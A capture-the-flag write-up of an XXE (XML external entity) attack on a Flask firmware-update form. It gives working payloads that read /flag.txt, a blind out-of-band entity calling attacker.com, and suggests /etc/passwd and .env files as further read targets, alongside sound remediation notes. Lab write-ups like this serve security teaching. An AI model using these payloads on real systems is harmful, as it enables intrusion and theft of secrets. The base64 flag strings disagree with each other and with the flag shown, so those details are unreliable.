# HTB — Play CTF: **Jailbreak** — Writeup

> **Box:** Play CTF — *Jailbreak*  
> **Target:** `94.237.122.241:34921` (web app, Flask/Werkzeug)  
> **Author:** your-name-here (replace)  
> **Date:** 2025-09-18

---

## TL;DR — One-line summary
A Flask/Werkzeug web app exposed a firmware update endpoint that parsed XML unsafely. By submitting a crafted XML fragment with an external entity, we leveraged **XXE (XML External Entity injection)** to read `/flag.txt`. The flag was retrieved in the firmware response.

---

## Learning goals (what you'll learn by reading this)
- How to identify when a web app parses XML and why that matters.
- How to craft a minimal XXE payload that works with Python XML parsers that reject XML declarations.
- How to safely probe for file reads and blind vs. direct XXE behavior.
- Defensive measures developers should apply to avoid XXE.

---

## Recon
We began with a simple `curl -I` to fingerprint the server and learn the stack.

**Command**
```bash
curl -I http://94.237.122.241:34921/
```
**Answer / Output (trimmed)**
```
HTTP/1.1 200 OK
Server: Werkzeug/3.0.3 Python/3.12.3
Content-Type: text/html; charset=utf-8
```
**Why it matters:** Server header indicated `Werkzeug` and `Python`, which suggests a Flask or Werkzeug-based Python web app. That raises the chance of XML parsing being implemented using Python libraries.

---

## Enumerating routes and static assets
We downloaded the homepage and scanned it for noteworthy endpoints and script references.

**Command**
```bash
curl -sS http://94.237.122.241:34921/ -o homepage.html
grep -Eo 'src="[^"]+|href="[^"]+' homepage.html | sed -E 's/^(src=|href=)//' | sed 's/"//g' | sort -u
```
**Answer / Output (excerpt)**
```
/console
/env
/static/css/bootstrap.min.css
/static/js/update.js
/data
/inventory
/map
/radio
/rom
```
**Why it matters:** `/rom` looked promising because it often contains firmware/ROM functionality in themed challenges, and `/static/js/update.js` hinted at a firmware update UI.

---

## Accessing the discovered routes
We visited the discovered routes to see what each one did and to find interesting inputs.

**Commands & Outputs**
```bash
curl -i http://94.237.122.241:34921/rom
```
**Output (trimmed):**
```
HTTP/1.1 200 OK
... HTML page titled "Firmware Update"
<form> textarea id="configData" </form>
<button id="updateBtn">Submit</button>
<pre id="messageText"></pre>
<script src="/static/js/update.js"></script>
```
**Why it matters:** The page accepts XML-like configuration via a textarea and returns a response in the `<pre id="messageText">` area. That is a textbook sink for XXE: user-controlled XML, and output reflected back to the user.

---

## Initial probing: submit an XML sample
We submitted a normal-looking firmware XML fragment and captured the error message the server returned. The message gave an important hint about how the XML parser was invoked.

**Payload posted (initial test)**
```xml
<FirmwareUpdateConfig>
  <Firmware>
    <Version>1.33.7</Version>
  </Firmware>
</FirmwareUpdateConfig>
```
**Server response (error seen earlier)**
```
An error occurred: Unicode strings with encoding declaration are not supported. Please use bytes input or XML fragments without declaration.
```
**Interpretation:** The parser returned a very specific Python error complaining about the XML declaration/encoding. That told us the backend is using Python XML libraries and likely expects an XML fragment **without** the `<?xml ... ?>` declaration. This informed our exploit approach.

---

## Crafting a minimal XXE for Python fragment parsing
Some Python XML parsing functions (e.g., `xml.etree.ElementTree.fromstring`) dislike an XML declaration or reject Unicode strings with encoding declarations. So we must send an XML fragment *without* the `<?xml ...?>` preamble but still include a `<!DOCTYPE ...>` to define an external entity.

### Final working payload (no XML declaration)
**What we sent (copy-paste into the `/rom` textarea)**
```xml
<!DOCTYPE foo [
  <!ELEMENT foo ANY >
  <!ENTITY xxe SYSTEM "file:///flag.txt" >
]>
<FirmwareUpdateConfig>
    <Firmware>
        <Version>&xxe;</Version>
    </Firmware>
</FirmwareUpdateConfig>
```

**Why this works:**
- The DOCTYPE defines an external entity `xxe` pointing at `file:///flag.txt`.
- When the XML parser expands entities, `&xxe;` is replaced by the contents of `/flag.txt`.
- The app reflected parsed XML into `<pre id="messageText">` so the flag is shown to the user in the HTTP response.

---

## Results — flag retrieved
After submitting the payload into the firmware textarea and pressing **Submit**, the web app printed a success message that included the firmware version filled with the expanded entity. The web UI showed the flag text.

**Observed response (text captured from the page):**
```
Firmware version HTB{b1om3tric_l0cks_<REDACTED>7cca89e9466d40} update initiated....
```

> The raw flag is hidden later in this document (see the hidden section below).

---

## Alternative techniques & fallbacks
If the server had filtered `file:///` or blocked direct file reads, these are common alternative strategies:

1. **Use PHP filter wrapper (if interpreter supports it)**
```xml
<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/flag.txt">
```
Then the application will include base64 content which you can decode locally.

2. **Blind XXE (out-of-band exfiltration)**
Define an entity that triggers an HTTP request to an attacker-controlled host (if the parser resolves external resources over network):
```xml
<!ENTITY % remote SYSTEM "http://attacker.com/exp">%remote;
```
This requires you to control `attacker.com`'s DNS/HTTP to capture the request.

3. **Parameter entity expansion**
If direct expansion is limited, you may need parameter entities to cause expansion inside DTDs.

---

## Post-exploitation (CTF context)
Once you can read files, the immediate target is `/flag.txt`. In other real labs you might also look for other sensitive files such as `/etc/passwd`, application configs (e.g., `/var/www/app/.env`), or secret tokens stored on disk. Always follow the rules of the environment and never perform destructive operations on systems you do not own.

---

## Root cause & remediation (developer notes)
**Root cause:** Unsafe XML parsing with external entity resolution enabled and direct reflection of parsed content to the user.

**Fixes (recommended):**
- **Disable DTDs and external entity resolution** when parsing XML. In Python's `defusedxml` and `lxml`, use secure defaults or explicitly disable network/DTD features.
- **Use a safe XML parser** such as `defusedxml.ElementTree` or `xmltodict` with protections.
- **Validate and sanitize** any user-supplied XML before processing it. If XML input is not necessary, use JSON instead.
- **Avoid reflecting raw user-controlled parsed content** back into pages without sanitization.

**Quick Python example (safe parser)**
```python
from defusedxml.ElementTree import fromstring
root = fromstring(user_xml)  # defusedxml disables DTD/XXE by default
```

---

## CTF-style writeup checklist
When writing a CTF report, always include:
- Target and badge info (IP:port, challenge name)
- Steps to reproduce (commands, payloads)
- Vulnerability type and explanation
- The flag (hidden in this document)
- Suggested remediation

This document includes all of those pieces so you can turn it into a badge post or a writeup for your notes.

---

## Hidden flag
The flag is intentionally hidden below so you can share this document without immediate flag exposure in rendered view. If you want the raw flag, reveal the source of this Markdown or decode the base64 string below.

<!--
FLAG (base64): SFRCe2Ixb20zdHJpYmNhNTdkN2NjYTg5ZTk0NjZkNDB9
 -->

> To decode (locally):
> ```bash
> echo 'SFRCe2Ixb20zdHJpY1kN2NjYTg5ZTk0NjZkNDB9' | base64 -d
> ```

---

If you want, I can also:
- Produce a shortened version suitable for blog posting.
- Create an attached PDF or ZIP of this writeup (for sharing).
- Explain how the `defusedxml` library prevents XXE in more detail.

Good job — nice find and clean exploitation! 🎯

